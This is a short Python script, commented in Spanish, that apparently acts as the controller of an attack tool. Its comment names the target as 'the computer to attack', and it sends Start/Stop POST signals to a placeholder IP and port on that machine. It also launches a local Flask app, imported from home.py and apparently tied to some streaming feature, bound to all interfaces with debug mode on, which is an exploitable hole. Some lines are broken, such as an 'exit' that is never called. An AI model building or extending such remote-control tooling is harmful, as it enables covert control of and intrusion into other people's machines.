import requests
from flask import Flask
import multiprocessing as mp
from Presentacion import eye
from colorama import Fore, Style
from home import app


code = 0

def start_streaming():
    # Accion para ejecutar otra tarea
    exec(open("home.py").read())


def start(url,data):
    try:
        #Enviar la peticion POST utilizando requests
        response = requests.post(url,data=data, timeout= 10)
        response.raise_for_status()
        print(response.status_code)
        print("Entramos en try")
        if response.status_code == 200:
            print("Entramos con 200")

    except requests.exceptions.RequestException as e:
        print("Error en la peticion: ",e)

def stop(url,data):
    try:
        #enviar peticion POST
        response = requests.post(url=url,data=data,timeout=10)
        response.raise_for_status()
        print(response.status_code)
    except requests.exceptions.RequestException as e:
        print("Error en la peticion: ", e)

def main(option):
    try:
        #URL de la computadora a atacar
        url = "http://IP:puerto/Start"

        #datos a enviar en la peticion POST
        data = {"signal":option}

        if option == 'Start' or option == 'start':
            start(url,data=data)

        elif option == 'Stop' or option == 'stop':
            stop(url,data=data)

        elif option == 'Exit' or option == 'exit':
            exit
        else:
            print('No has ingresado un dat correcto. ')
    except ValueError:
        print("Error al ingresar un dato, intentalo de nuevo")

def option():
    eye()
    options = input(Fore.RED + "----> " + Style.RESET_ALL)
    return options

if __name__ == "__main__":
    #ejecutamos el programa
    main(option())
    app.run(debug=True, host='0.0.0.0')
